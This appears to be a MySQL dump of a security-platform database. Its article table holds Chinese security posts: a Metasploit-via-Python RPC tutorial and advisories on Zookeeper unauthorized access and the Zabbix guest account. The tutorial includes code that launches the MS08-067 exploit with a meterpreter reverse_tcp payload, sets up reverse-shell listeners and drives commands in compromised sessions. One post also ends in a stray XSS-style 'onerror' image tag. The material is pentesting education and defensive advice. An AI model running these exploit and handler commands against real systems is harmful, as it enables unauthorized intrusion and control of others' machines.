-- MySQL dump 10.13  Distrib 5.7.37, for Linux (x86_64)
--
-- Host: localhost    Database: insight2
-- ------------------------------------------------------
-- Server version	5.7.37

/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8 */;
/*!40103 SET @OLD_TIME_ZONE=@@TIME_ZONE */;
/*!40103 SET TIME_ZONE='+00:00' */;
/*!40014 SET @OLD_UNIQUE_CHECKS=@@UNIQUE_CHECKS, UNIQUE_CHECKS=0 */;
/*!40014 SET @OLD_FOREIGN_KEY_CHECKS=@@FOREIGN_KEY_CHECKS, FOREIGN_KEY_CHECKS=0 */;
/*!40101 SET @OLD_SQL_MODE=@@SQL_MODE, SQL_MODE='NO_AUTO_VALUE_ON_ZERO' */;
/*!40111 SET @OLD_SQL_NOTES=@@SQL_NOTES, SQL_NOTES=0 */;

--
-- Current Database: `insight2`
--

CREATE DATABASE /*!32312 IF NOT EXISTS*/ `insight2` /*!40100 DEFAULT CHARACTER SET utf8 */;

USE `insight2`;

--
-- Table structure for table `app`
--

DROP TABLE IF EXISTS `app`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `app` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `_id` varchar(255) NOT NULL,
  `appname` varchar(255) NOT NULL,
  `apptype` int(11) NOT NULL,
  `level` int(11) NOT NULL,
  `sec_level` int(11) NOT NULL,
  `group_id` int(11) NOT NULL,
  `status` int(11) NOT NULL,
  `comment` varchar(255) NOT NULL,
  `check_time` double NOT NULL,
  `offonline_time` double NOT NULL,
  `create_time` double NOT NULL,
  `update_time` double NOT NULL,
  `sec_owner` int(11) NOT NULL,
  `sensitive_data_count` int(11) NOT NULL,
  `sensitive_data` text NOT NULL,
  `secure_level` int(11) NOT NULL,
  `business_cata` text,
  `downtime` int(11) NOT NULL,
  `is_open` int(11) NOT NULL,
  `is_interface` int(11) NOT NULL,
  `is_https` int(11) NOT NULL,
  `eid` varchar(255) NOT NULL,
  `crontab` varchar(255) NOT NULL,
  `op_user_id` varchar(255) NOT NULL,
  PRIMARY KEY (`id`),
  KEY `app_group_id` (`group_id`),
  CONSTRAINT `app_ibfk_1` FOREIGN KEY (`group_id`) REFERENCES `group` (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=9 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `app`
--

LOCK TABLES `app` WRITE;
/*!40000 ALTER TABLE `app` DISABLE KEYS */;
INSERT INTO `app` VALUES (5,'620ca330b1df1709463aa01f','测试应用1',30,30,30,2,10,'',1644995376.9337342,1644995376.9337351,1644995376.9337356,1644995376.933736,8,10,'',0,'',30,1,0,0,'','',''),(6,'620ca3b8b1df1709463aa020','测试应用2',30,10,10,2,10,'',1644995512.058682,1644995512.0586832,1644995512.0586836,1644995512.058684,8,40,'',0,'',10,1,0,1,'','',''),(7,'620e01d8b1df1709463aa112','测试应用3',10,10,10,3,10,'',1645085144.5032592,1645085144.5032604,1645085144.503261,1645085144.5032618,8,10,'',0,'',10,1,0,0,'','',''),(8,'62133183887ab8b7c2881a05','测试应用4',10,10,10,2,20,'',1645425027.1815116,1645425027.1815126,1645425027.1815133,1645425027.1815138,8,30,'',0,'',10,1,0,0,'','','');
/*!40000 ALTER TABLE `app` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `article`
--

DROP TABLE IF EXISTS `article`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `article` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `_id` varchar(255) NOT NULL,
  `title` varchar(255) NOT NULL,
  `alias` varchar(255) NOT NULL,
  `category` int(11) NOT NULL,
  `author` varchar(255) NOT NULL,
  `publish_time` double NOT NULL,
  `publish_datetime` datetime NOT NULL,
  `modify_time` double NOT NULL,
  `status` int(11) NOT NULL,
  `cover` longtext,
  `summary` text NOT NULL,
  `content_type` int(11) NOT NULL,
  `raw_content` longtext NOT NULL,
  `md_raw_content` longtext NOT NULL,
  `content` longtext NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=6 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `article`
--

LOCK TABLES `article` WRITE;
/*!40000 ALTER TABLE `article` DISABLE KEYS */;
INSERT INTO `article` VALUES (1,'5de76148152e93ac81d80014','减小TemplatesImplpayload的几种方式','减小TemplatesImplpayload的几种方式',3,'insight2@example.cn',1567762736,'2022-01-27 08:15:18',1567762736,1,'','',1,'','编辑器上传图片一张一张实在是太难了，太难了，看github的链接吧。\n\nhttps://github.com/SPuerBRead/ddup/blob/master/%E7%BC%A9%E5%B0%8Fysoserial%20payload%E4%BD%93%E7%A7%AF%E7%9A%84%E5%87%A0%E4%B8%AA%E6%96%B9%E6%B3%95/%E7%BC%A9%E5%B0%8Fysoserial%20payload%E4%BD%93%E7%A7%AF%E7%9A%84%E5%87%A0%E4%B8%AA%E6%96%B9%E6%B3%95.md\n\n![dashboard.png](upload/images/43281a887a6abf99fa4319bbd9afe32b.png)\n\n<img src=x onerror=>','<p>编辑器上传图片一张一张实在是太难了，太难了，看github的链接吧。<\\/p>\n<p>https://github.com/SPuerBRead/ddup/blob/master/%E7%BC%A9%E5%B0%8Fysoserial%20payload%E4%BD%93%E7%A7%AF%E7%9A%84%E5%87%A0%E4%B8%AA%E6%96%B9%E6%B3%95/%E7%BC%A9%E5%B0%8Fysoserial%20payload%E4%BD%93%E7%A7%AF%E7%9A%84%E5%87%A0%E4%B8%AA%E6%96%B9%E6%B3%95.md<\\/p>\n<p><img src=\"upload/images/43281a887a6abf99fa4319bbd9afe32b.png\" alt=\"dashboard.png\" /><\\/p>\n<img src=x onerror=>'),(2,'5de76148152e93ac81d80012','Apache Commons Collections反序列化','Apache Commons Collections反序列化',3,'insight2@example.cn',1566380677,'2022-01-27 08:15:18',1567751143,1,'','',1,'','# Apache Commons Collections反序列化\r\n\r\n编辑器上传图片一张一张实在是太难了，太难了，看github的链接吧。\r\n\r\nhttps://github.com/SPuerBRead/ddup/blob/master/CommonsCollections%E7%B3%BB%E5%88%97gadgets%E5%88%86%E6%9E%90/CommonsCollections%E7%B3%BB%E5%88%97gadgets%E5%88%86%E6%9E%90.md','<h1>Apache Commons Collections反序列化<\\/h1>\n<p>编辑器上传图片一张一张实在是太难了，太难了，看github的链接吧。<\\/p>\n<p><a href=\"https://github.com/SPuerBRead/ddup/blob/master/CommonsCollections%E7%B3%BB%E5%88%97gadgets%E5%88%86%E6%9E%90/CommonsCollections%E7%B3%BB%E5%88%97gadgets%E5%88%86%E6%9E%90.md\" rel=\"nofollow\">https://github.com/SPuerBRead/ddup/blob/master/CommonsCollections%E7%B3%BB%E5%88%97gadgets%E5%88%86%E6%9E%90/CommonsCollections%E7%B3%BB%E5%88%97gadgets%E5%88%86%E6%9E%90.md<\\/a><\\/p>'),(3,'5de76148152e93ac81d80010','Msf结合Python的使用','Msf结合Python的使用',3,'insight2@example.cn',1545726396,'2022-01-27 08:15:18',1545728835,1,'','',1,'','# Msf结合Python的使用\r\n===================================================================================================================不太华丽的分割线================================================================================================================================\r\n\r\n## python依赖库\r\n```shell\r\npip install msgpack\r\n#SpiderLabs的那份的msfrpc库的call函数有点问题，我改了一下\r\nwget https://raw.githubusercontent.com/fnmsd/msfrpc/master/python-msfrpc/msfrpc.py\r\n```\r\n\r\n## 起手\r\n\r\nmetaspolit端启动msfrpc\r\n\r\n```ruby\r\nload msgrpc Pass=Rinne\r\n#详细参数\r\n#load msgrpc ServerHost=192.168.1.0 ServerPort=55553 User=user Pass=\'pass123\'\r\n```\r\n\r\n执行结果：\r\n![](/upload/img/2018122508211545726106.png)\r\nPS：也可以不启动msf来启动msfrpcd，不过不推荐，不方便调试。\r\n\r\n```shell\r\nruby msfrpcd -U user -P pass123 -p 55552 -a 127.0.0.1\r\n```\r\n\r\npyhton端进行连接：\r\n\r\n```python\r\nfrom msfrpc import Msfrpc\r\n#默认连接127.0.0.1:55552,如果指定了端口或host可以将空字典改为{\"host\":hostname,\"port\":port}的形式指定端口\r\nclient = Msfrpc({})\r\nclient.login(\'msf\',\'Rinne\')#登陆成功返回True\r\n```\r\n\r\n得到一个登陆了的MsfRPC客户端，登陆保持的时间似乎比较短，长时间不用时需要重新登陆。\r\n\r\n## 用法\r\n\r\n### 直接读写Console的用法（不推荐）\r\n\r\n网上很文章是这么做的，先说下这种\r\n\r\n在之前的登陆后的client基础上创建一个控制台，进行写入命令、读取输出，和直接在Metaspolit中操作是相同,个人感觉不太灵活。\r\n\r\n以下转自：https://www.freebuf.com/sectool/61282.html\r\n\r\n```python\r\n#创建控制台\r\nress = client.call(\'console.create\')\r\nconsole_id = ress[\'id\']\r\n#构建好要执行的命令\r\ncommands = \"\"\"use exploit/windows/smb/ms08_067_netapi\r\nset PAYLOAD windows/meterpreter/reverse_tcp\r\nset RHOST \"\"\"+RHOST+\"\"\"\r\nset LHOST \"\"\"+LHOST+\"\"\"\r\nset LPORT \"\"\"+LPORT+\"\"\"\r\nset ExitOnSession false\r\nexploit -z\r\n\"\"\"\r\nprint \"[+] Exploiting MS08-067 on: \"+RHOST\r\n#将构建好的命令写入控制台\r\nclient.call(\'console.write\',[console_id,commands])\r\n#读取执行结果\r\nres = client.call(\'console.read\',[console_id])\r\nresult = res[\'data\'].split(\'\\n\')\r\n```\r\n\r\n### 使用module\\jobs\\sessions API进行操作\r\n\r\n1. module API\r\n\r\n   ```python\r\n   #ModuleType exploit/post/payload/payloads/encoders\r\n   client.call(\'module.execute\',[\"ModuleType\", \"ModuleName\", {\r\n     \"RHOST\" => \"1.2.3.4\",\r\n     \"RPORT\" => \"80\"\r\n     }])\r\n   ```\r\n\r\n   比如想使用multi/handler的进行meterpreter的监听（metasploit中设置参数时参数名可以忽略大小写，API调用时一定要注意大小写）\r\n\r\n   ```python\r\n   client.call(\'module.execute\',[\'exploit\',\'multi/handler\',{\r\n       \'LHOST\':\'0.0.0.0\',\r\n       \'LPORT\':22334,\r\n       \'PAYLOAD\':\'windows/meterpreter/reverse_tcp\'\r\n   }])\r\n   ```\r\n\r\n![](/upload/img/2018122508221545726133.png)\r\n   可以看到成功创建了任务，如果任务创建不成功则job_id为None\r\n\r\n1. jobs API\r\n\r\n   - 刚才创健的那个任务我们可以使用job.list API看到\r\n\r\n   ```python\r\n   client.call(\'job.list\')\r\n   ```\r\n\r\n\r\n\r\n![](/upload/img/2018122508221545726153.png)\r\n   - 如果想看到job的详细情况可以使用job.info API\r\n\r\n   ```python\r\n   client.call(\'job.info\',[jobid])\r\n   ```\r\n\r\n![](/upload/img/2018122508231545726203.png)\r\n   - 如果想停止任务使用job.stop API\r\n\r\n   ```python\r\n   client.call(\'job.stop\',[jobid])\r\n   ```\r\n![](/upload/img/2018122508231545726226.png)\r\n\r\n   同时，可以看到对一个不存在的job使用stop会返回error。\r\n\r\n   1. session API\r\n\r\n   - 查看当前session\r\n\r\n   ```python\r\n   client.call(\'session.list\')\r\n   ```\r\n\r\n   会返回详细的session信息\r\n![](/upload/img/2018122508241545726260.png)\r\n\r\n   - 停止session\r\n\r\n     ```python\r\n     client.call(\'session.stop\',[sessionid])\r\n     #还有个session.meterpreter_session_kill是杀掉meterpreter打开的channel或者shell\r\n     ```\r\n\r\n   - 操作shell类session(直接往shell里写命令)\r\n\r\n     ```python\r\n     client.call(\'session.shell_write\',[sessionid,\'whoami\'])\r\n     client.call(\'session.shell_read\',[sessionid])\r\n     ```\r\n\r\n   - 操作meterpreter类session（相当于直接在控制台里与meterpreter进行交互）\r\n\r\n     ```python\r\n     client.call(\'session.meterpreter_write\',[sessionid,\'getuid\'])\r\n     client.call(\'session.meterpreter_read\',[sessionid])\r\n     #还有一个session.meterpreter_run_single可以自行看下手册\r\n     ```\r\n![](/upload/img/2018122508251545726339.png)\r\n   - session升级(shell升级到meterpreter)\r\n\r\n     ```\r\n     client.call(\'session.shell_upgrade\',[sessionid])\r\n     ```\r\n## 额外的一点东西\r\n\r\n有的时候只是为了批量执行命令可以不使用msfrpc，直接写一个rc文件进行批量执行即可。\r\n\r\n比如我只是想快速开一个监听器,按照metaspolit命令写这样一个脚本即可，比如叫listener.rc\r\n\r\n```ruby\r\nuse multi/handler\r\nset payload windows/meterpter/reverse_tcp\r\nset lhost 0.0.0.0\r\nset lport 12345\r\nset exitonsession false\r\nexploit -j -z\r\n```\r\n\r\n打开msf直接执行resource listener.rc；或者msfconsole -r listener.rc。\r\n\r\n------\r\n\r\n同样在meterpreter session连接的时候，可以让其自动执行脚本。\r\n\r\n```\r\nuse multi/handler\r\nset AutoRunScript \"multi_console_command -r /root/meterpreter.rc\"\r\n```\r\n\r\n注意，一定要set AutoRunScript以后再启动handler，否则不生效。\r\n\r\n设置好后，当新的session接入后就会自动执行文件中的命令。\r\n\r\n## 参考\r\n\r\n1. MSF常用RPC API（moudles\\sessions\\jobs....)\r\n\r\n   https://metasploit.help.rapid7.com/docs/standard-api-methods-reference\r\n\r\n2. RPC相关参数\r\n\r\n   https://metasploit.help.rapid7.com/docs/rpc-api','<h1>Msf结合Python的使用<\\/h1>\n<p>===================================================================================================================不太华丽的分割线================================================================================================================================<\\/p>\n<h2>python依赖库<\\/h2>\n<p>```shell\npip install msgpack<\\/p>\n<h1>SpiderLabs的那份的msfrpc库的call函数有点问题，我改了一下<\\/h1>\n<p>wget <a href=\"https://raw.githubusercontent.com/fnmsd/msfrpc/master/python-msfrpc/msfrpc.py\" rel=\"nofollow\">https://raw.githubusercontent.com/fnmsd/msfrpc/master/python-msfrpc/msfrpc.py<\\/a>\n```<\\/p>\n<h2>起手<\\/h2>\n<p>metaspolit端启动msfrpc<\\/p>\n<p>```ruby\nload msgrpc Pass=Rinne<\\/p>\n<h1>详细参数<\\/h1>\n<h1>load msgrpc ServerHost=192.168.1.0 ServerPort=55553 User=user Pass=\'pass123\'<\\/h1>\n<p>```<\\/p>\n<p>执行结果：\n<img alt=\"\" src=\"/upload/img/2018122508211545726106.png\">\nPS：也可以不启动msf来启动msfrpcd，不过不推荐，不方便调试。<\\/p>\n<p><code>shell\nruby msfrpcd -U user -P pass123 -p 55552 -a 127.0.0.1<\\/code><\\/p>\n<p>pyhton端进行连接：<\\/p>\n<p>```python\nfrom msfrpc import Msfrpc<\\/p>\n<h1>默认连接127.0.0.1:55552,如果指定了端口或host可以将空字典改为{\"host\":hostname,\"port\":port}的形式指定端口<\\/h1>\n<p>client = Msfrpc({})\nclient.login(\'msf\',\'Rinne\')#登陆成功返回True\n```<\\/p>\n<p>得到一个登陆了的MsfRPC客户端，登陆保持的时间似乎比较短，长时间不用时需要重新登陆。<\\/p>\n<h2>用法<\\/h2>\n<h3>直接读写Console的用法（不推荐）<\\/h3>\n<p>网上很文章是这么做的，先说下这种<\\/p>\n<p>在之前的登陆后的client基础上创建一个控制台，进行写入命令、读取输出，和直接在Metaspolit中操作是相同,个人感觉不太灵活。<\\/p>\n<p>以下转自：<a href=\"https://www.freebuf.com/sectool/61282.html\" rel=\"nofollow\">https://www.freebuf.com/sectool/61282.html<\\/a><\\/p>\n<p>```python<\\/p>\n<h1>创建控制台<\\/h1>\n<p>ress = client.call(\'console.create\')\nconsole_id = ress[\'_id\']<\\/p>\n<h1>构建好要执行的命令<\\/h1>\n<p>commands = \"\"\"use exploit/windows/smb/ms08_067_netapi\nset PAYLOAD windows/meterpreter/reverse_tcp\nset RHOST \"\"\"+RHOST+\"\"\"\nset LHOST \"\"\"+LHOST+\"\"\"\nset LPORT \"\"\"+LPORT+\"\"\"\nset ExitOnSession false\nexploit -z\n\"\"\"\nprint \"[+] Exploiting MS08-067 on: \"+RHOST<\\/p>\n<h1>将构建好的命令写入控制台<\\/h1>\n<p>client.call(\'console.write\',[console_id,commands])<\\/p>\n<h1>读取执行结果<\\/h1>\n<p>res = client.call(\'console.read\',[console_id])\nresult = res[\'data\'].split(\'\\n\')\n```<\\/p>\n<h3>使用module\\jobs\\sessions API进行操作<\\/h3>\n<ol>\n<li>module API<\\/li>\n<\\/ol>\n<p><code>python\n   #ModuleType exploit/post/payload/payloads/encoders\n   client.call(\'module.execute\',[\"ModuleType\", \"ModuleName\", {\n     \"RHOST\" => \"1.2.3.4\",\n     \"RPORT\" => \"80\"\n     }])<\\/code><\\/p>\n<p>比如想使用multi/handler的进行meterpreter的监听（metasploit中设置参数时参数名可以忽略大小写，API调用时一定要注意大小写）<\\/p>\n<p><code>python\n   client.call(\'module.execute\',[\'exploit\',\'multi/handler\',{\n       \'LHOST\':\'0.0.0.0\',\n       \'LPORT\':22334,\n       \'PAYLOAD\':\'windows/meterpreter/reverse_tcp\'\n   }])<\\/code><\\/p>\n<p><img alt=\"\" src=\"/upload/img/2018122508221545726133.png\">\n   可以看到成功创建了任务，如果任务创建不成功则job_id为None<\\/p>\n<ol>\n<li>\n<p>jobs API<\\/p>\n<\\/li>\n<li>\n<p>刚才创健的那个任务我们可以使用job.list API看到<\\/p>\n<\\/li>\n<\\/ol>\n<p><code>python\n   client.call(\'job.list\')<\\/code><\\/p>\n<p><img alt=\"\" src=\"/upload/img/2018122508221545726153.png\">\n   - <a href=\"http://如果想看到job的详细情况可以使用job.info\" rel=\"nofollow\">如果想看到job的详细情况可以使用job.info<\\/a> API<\\/p>\n<p><code>python\n   client.call(\'<a href=\"http://job.info\" rel=\"nofollow\">job.info<\\/a>\',[jobid])<\\/code><\\/p>\n<p><img alt=\"\" src=\"/upload/img/2018122508231545726203.png\">\n   - 如果想停止任务使用job.stop API<\\/p>\n<p><code>python\n   client.call(\'job.stop\',[jobid])<\\/code>\n<img alt=\"\" src=\"/upload/img/2018122508231545726226.png\"><\\/p>\n<p>同时，可以看到对一个不存在的job使用stop会返回error。<\\/p>\n<ol>\n<li>\n<p>session API<\\/p>\n<\\/li>\n<li>\n<p>查看当前session<\\/p>\n<\\/li>\n<\\/ol>\n<p><code>python\n   client.call(\'session.list\')<\\/code><\\/p>\n<p>会返回详细的session信息\n<img alt=\"\" src=\"/upload/img/2018122508241545726260.png\"><\\/p>\n<ul>\n<li>\n<p>停止session<\\/p>\n<p><code>python\n client.call(\'session.stop\',[sessionid])\n #还有个session.meterpreter_session_kill是杀掉meterpreter打开的channel或者shell<\\/code><\\/p>\n<\\/li>\n<li>\n<p>操作shell类session(直接往shell里写命令)<\\/p>\n<p><code>python\n client.call(\'session.shell_write\',[sessionid,\'whoami\'])\n client.call(\'session.shell_read\',[sessionid])<\\/code><\\/p>\n<\\/li>\n<li>\n<p>操作meterpreter类session（相当于直接在控制台里与meterpreter进行交互）<\\/p>\n<p><code>python\n client.call(\'session.meterpreter_write\',[sessionid,\'getuid\'])\n client.call(\'session.meterpreter_read\',[sessionid])\n #还有一个session.meterpreter_run_single可以自行看下手册<\\/code>\n<img alt=\"\" src=\"/upload/img/2018122508251545726339.png\">\n   - session升级(shell升级到meterpreter)<\\/p>\n<p><code>client.call(\'session.shell_upgrade\',[sessionid])<\\/code><\\/p>\n<h2>额外的一点东西<\\/h2>\n<\\/li>\n<\\/ul>\n<p>有的时候只是为了批量执行命令可以不使用msfrpc，直接写一个rc文件进行批量执行即可。<\\/p>\n<p>比如我只是想快速开一个监听器,按照metaspolit命令写这样一个脚本即可，比如叫listener.rc<\\/p>\n<p><code>ruby\nuse multi/handler\nset payload windows/meterpter/reverse_tcp\nset lhost 0.0.0.0\nset lport 12345\nset exitonsession false\nexploit -j -z<\\/code><\\/p>\n<p>打开msf直接执行resource listener.rc；或者msfconsole -r listener.rc。<\\/p>\n\n<p>同样在meterpreter session连接的时候，可以让其自动执行脚本。<\\/p>\n<p><code>use multi/handler\nset AutoRunScript \"multi_console_command -r /root/meterpreter.rc\"<\\/code><\\/p>\n<p>注意，一定要set AutoRunScript以后再启动handler，否则不生效。<\\/p>\n<p>设置好后，当新的session接入后就会自动执行文件中的命令。<\\/p>\n<h2>参考<\\/h2>\n<ol>\n<li>MSF常用RPC API（moudles\\sessions\\jobs....)<\\/li>\n<\\/ol>\n<p><a href=\"https://metasploit.help.rapid7.com/docs/standard-api-methods-reference\" rel=\"nofollow\">https://metasploit.help.rapid7.com/docs/standard-api-methods-reference<\\/a><\\/p>\n<ol>\n<li>RPC相关参数<\\/li>\n<\\/ol>\n<p><a href=\"https://metasploit.help.rapid7.com/docs/rpc-api\" rel=\"nofollow\">https://metasploit.help.rapid7.com/docs/rpc-api<\\/a><\\/p>'),(4,'5de76148152e93ac81d8000e','Zookeeper未授权访问漏洞','Zookeeper未授权访问漏洞',10,'qitao4@example.cn',1543227040,'2022-01-27 08:15:18',1543227040,1,'','',1,'','| **漏洞类型** | **影响组件** | **危害程度**        |\r\n| ------------ | ------------ | ------------------- |\r\n| 未授权访问   | zookeeper    | 高危                |\r\n| **CVE**      | **发现时间** | **对应poc**         |\r\n| 无           | 无           | Zookeeper_unauth.py |\r\n\r\n## 漏洞描述\r\n\r\n#### 影响版本\r\n\r\n&emsp;&emsp;&emsp;&emsp;全版本\r\n\r\n#### 检查项目\r\n\r\n&emsp;&emsp;&emsp;&emsp;Zookeeper未授权访问\r\n\r\n#### 相关链接\r\n\r\n&emsp;&emsp;&emsp;&emsp;https://yq.aliyun.com/articles/616751\r\n\r\n&emsp;&emsp;&emsp;&emsp;http://zookeeper.apache.org/doc/r3.1.2/zookeeperProgrammers.html#sc_ZooKeeperAccessControl\r\n\r\n## 漏洞详情\r\n\r\n&emsp;&emsp;&emsp;&emsp;zookeeper是分布式协同管理工具，常用来管理系统配置信息，提供分布式协同服务。\r\n\r\n&emsp;&emsp;&emsp;&emsp;使用时只要知道zookeeper服务端的IP和Port，任务用户或者客户端根本不需要任何的认证就可以连上zookeeper的服务端，并且可以对znode进行增删等操作。这样数据是非常不安全的，极易被攻击和篡改。但zookeeper服务端目前不支持连接时认证。\r\n\r\n&emsp;&emsp;&emsp;&emsp;为了保障ZooKeeper的数据安全，提供了一套完整的ACL(Access Control List)权限控制机制来保障数据的安全。 \r\n\r\n## 修复建议\r\n\r\n&emsp;&emsp;&emsp;&emsp;使用zookeeper提供的ADL权限控制机制，详细请参考：\r\n\r\n&emsp;&emsp;&emsp;&emsp;https://www.cnblogs.com/ilovena/p/9484522.html','<p>| <strong>漏洞类型<\\/strong> | <strong>影响组件<\\/strong> | <strong>危害程度<\\/strong>        |\n| ------------ | ------------ | ------------------- |\n| 未授权访问   | zookeeper    | 高危                |\n| <strong>CVE<\\/strong>      | <strong>发现时间<\\/strong> | <strong>对应poc<\\/strong>         |\n| 无           | 无           | <a href=\"http://Zookeeper_unauth.py\" rel=\"nofollow\">Zookeeper_unauth.py<\\/a> |<\\/p>\n<h2>漏洞描述<\\/h2>\n影响版本\n<p>    全版本<\\/p>\n检查项目\n<p>    Zookeeper未授权访问<\\/p>\n相关链接\n<p>    <a href=\"https://yq.aliyun.com/articles/616751\" rel=\"nofollow\">https://yq.aliyun.com/articles/616751<\\/a><\\/p>\n<p>    <a href=\"http://zookeeper.apache.org/doc/r3.1.2/zookeeperProgrammers.html#sc_ZooKeeperAccessControl\" rel=\"nofollow\">http://zookeeper.apache.org/doc/r3.1.2/zookeeperProgrammers.html#sc_ZooKeeperAccessControl<\\/a><\\/p>\n<h2>漏洞详情<\\/h2>\n<p>    zookeeper是分布式协同管理工具，常用来管理系统配置信息，提供分布式协同服务。<\\/p>\n<p>    使用时只要知道zookeeper服务端的IP和Port，任务用户或者客户端根本不需要任何的认证就可以连上zookeeper的服务端，并且可以对znode进行增删等操作。这样数据是非常不安全的，极易被攻击和篡改。但zookeeper服务端目前不支持连接时认证。<\\/p>\n<p>    为了保障ZooKeeper的数据安全，提供了一套完整的ACL(Access Control List)权限控制机制来保障数据的安全。 <\\/p>\n<h2>修复建议<\\/h2>\n<p>    使用zookeeper提供的ADL权限控制机制，详细请参考：<\\/p>\n<p>    <a href=\"https://www.cnblogs.com/ilovena/p/9484522.html\" rel=\"nofollow\">https://www.cnblogs.com/ilovena/p/9484522.html<\\/a><\\/p>'),(5,'5de76148152e93ac81d8000c','ZabbixGuest账户未禁用','ZabbixGuest账户未禁用',10,'qitao4@example.cn',1543226948,'2022-01-27 08:15:18',1543226948,1,'','',1,'','| **漏洞类型** | **影响组件** | **危害程度**           |\r\n| ------------ | ------------ | ---------------------- |\r\n| 未授权访问   | Zabbix       | 中危                   |\r\n| **CVE**      | **发现时间** | **对应poc**            |\r\n| 无           | 无           | zabbix_guest_enable.py |\r\n\r\n## 漏洞描述\r\n\r\n#### 影响版本\r\n\r\n&emsp;&emsp;&emsp;&emsp;全版本\r\n\r\n#### 检查项目\r\n\r\n&emsp;&emsp;&emsp;&emsp;Guest账户是否启用\r\n\r\n#### 相关链接\r\n\r\n&emsp;&emsp;&emsp;&emsp;无\r\n\r\n## 漏洞详情\r\n\r\n&emsp;&emsp;&emsp;&emsp;zabbix是一个基于WEB界面的提供分布式系统监视以及网络监视功能的企业级的开源解决方案。\r\n\r\n&emsp;&emsp;&emsp;&emsp;zabbix能监视各种网络参数，保证服务器系统的安全运营；并提供灵活的通知机制以让系统管理员快速定位/解决存在的各种问题。\r\n\r\n&emsp;&emsp;&emsp;&emsp;zabbix在安装后默认guest账号开放，密码为空登陆，只能看到zabbix后台，存在安全隐患，需要将guest账户禁用。\r\n\r\n## 修复建议\r\n\r\n&emsp;&emsp;&emsp;&emsp;禁用guest账户','<p>| <strong>漏洞类型<\\/strong> | <strong>影响组件<\\/strong> | <strong>危害程度<\\/strong>           |\n| ------------ | ------------ | ---------------------- |\n| 未授权访问   | Zabbix       | 中危                   |\n| <strong>CVE<\\/strong>      | <strong>发现时间<\\/strong> | <strong>对应poc<\\/strong>            |\n| 无           | 无           | <a href=\"http://zabbix_guest_enable.py\" rel=\"nofollow\">zabbix_guest_enable.py<\\/a> |<\\/p>\n<h2>漏洞描述<\\/h2>\n影响版本\n<p>    全版本<\\/p>\n检查项目\n<p>    Guest账户是否启用<\\/p>\n相关链接\n<p>    无<\\/p>\n<h2>漏洞详情<\\/h2>\n<p>    zabbix是一个基于WEB界面的提供分布式系统监视以及网络监视功能的企业级的开源解决方案。<\\/p>\n<p>    zabbix能监视各种网络参数，保证服务器系统的安全运营；并提供灵活的通知机制以让系统管理员快速定位/解决存在的各种问题。<\\/p>\n<p>    zabbix在安装后默认guest账号开放，密码为空登陆，只能看到zabbix后台，存在安全隐患，需要将guest账户禁用。<\\/p>\n<h2>修复建议<\\/h2>\n<p>    禁用guest账户<\\/p>');
/*!40000 ALTER TABLE `article` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `asset`
--

DROP TABLE IF EXISTS `asset`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `asset` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `_id` varchar(255) NOT NULL,
  `app_id` int(11) NOT NULL,
  `name` varchar(255) NOT NULL,
  `value` varchar(255) NOT NULL,
  `type` varchar(255) NOT NULL,
  `is_open` int(11) NOT NULL,
  `is_https` int(11) NOT NULL,
  `apptype` varchar(255) NOT NULL,
  `status` int(11) NOT NULL,
  `create_time` double NOT NULL,
  `update_time` double NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=12 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `asset`
--

LOCK TABLES `asset` WRITE;
/*!40000 ALTER TABLE `asset` DISABLE KEYS */;
INSERT INTO `asset` VALUES (5,'620ca2b1b1df1709463aa01a',5,'a1','192.168.1.1','20',1,0,'10',0,1644995249.1652715,1644995249.1652722),(6,'620ca2c1b1df1709463aa01b',5,'a2','192.168.1.2','20',0,0,'20',0,1644995265.5583122,1644995265.5583131),(7,'620ca2e5b1df1709463aa01c',6,'b1','b1.com','10',1,1,'30',0,1644995301.105599,1644995301.1055996),(8,'620ca2f2b1df1709463aa01d',6,'b2','192.168.2.1','20',0,0,'20',0,1644995314.0436077,1644995314.0436087),(9,'620ca2fdb1df1709463aa01e',6,'b3','192.168.2.2','20',0,0,'10',0,1644995325.2257783,1644995325.225779),(10,'620e01a9b1df1709463aa111',7,'c1','192.168.3.1','20',1,0,'10',0,1645085097.7179775,1645085097.7179785),(11,'62132eba887ab8b7c2881a04',8,'c2','192.168.3.2','20',0,1,'10',0,1645424314.4543912,1645424314.4543927);
/*!40000 ALTER TABLE `asset` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `authmode`
--

DROP TABLE IF EXISTS `authmode`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `authmode` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `_id` varchar(255) NOT NULL,
  `name` varchar(255) NOT NULL,
  `mode` varchar(255) NOT NULL,
  `desc` varchar(255) NOT NULL,
  `config` text NOT NULL,
  `enable` int(11) NOT NULL,
  `create_time` double NOT NULL,
  `update_time` double NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `authmode`
--

LOCK TABLES `authmode` WRITE;
/*!40000 ALTER TABLE `authmode` DISABLE KEYS */;
/*!40000 ALTER TABLE `authmode` ENABLE KEYS */;
UNLOCK TABLES;

--
